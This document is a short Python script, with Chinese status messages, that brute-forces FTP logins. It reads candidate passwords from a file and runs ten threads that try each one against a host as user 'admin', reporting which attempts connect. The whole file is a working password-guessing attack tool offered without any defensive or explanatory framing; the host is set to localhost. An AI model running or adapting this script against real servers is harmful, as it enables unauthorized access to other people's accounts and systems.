import ftplib
import queue
import time
import threading

def ftp_bru():
    while not p.empty():
        password=p.get()
        password=password.replace('\n','')
        try:
            ftp=ftplib.FTP()
            ftp.connect(host)
            ftp.login(username,password)
            print('连接成功！')
            ftp.quit()
        except:
            print('连接失败！')
            time.sleep(1)

if __name__ == '__main__':
    p=queue.Queue()
    host = '127.0.0.1'
    username = 'admin'
    for password in open('ftp_pass.txt'):
        p.put(password)
    for i in range(10):
        t=threading.Thread(target=ftp_bru)
        t.start()









































